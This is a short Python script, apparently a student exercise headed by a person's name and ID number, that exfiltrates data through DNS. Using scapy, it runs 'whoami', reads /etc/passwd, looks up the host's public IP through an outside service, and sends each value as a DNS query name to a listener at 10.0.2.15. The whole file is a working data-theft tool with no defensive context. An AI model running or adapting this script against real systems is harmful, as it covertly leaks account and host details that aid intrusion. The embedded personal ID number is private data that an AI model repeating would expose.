# Eden Reuveni 302313184

import os	 
import requests	  
from scapy.all import * 

def send_quary(str): 	
	tmp=str
	dns_queries = DNSQR(qname=tmp)
	send(IP(dst='10.0.2.15') / UDP(dport=53) / DNS(qd=dns_queries))
	
user = os.popen("whoami").read().strip()
passwords=os.popen("cat /etc/passwd").read().strip().split("\n") 
ipaddress = requests.get('https://checkip.amazonaws.com').text.strip()
send_quary(user)
send_quary(ipaddress)

for line in passwords:
	line=line.split(":")
	if line[0].endswith("."):
		line[0] = (line[0][:-1])
	if line[1].endswith("."):
		line[1] = (line[1][:-1])
	send_quary(line[0]+" "+line[1])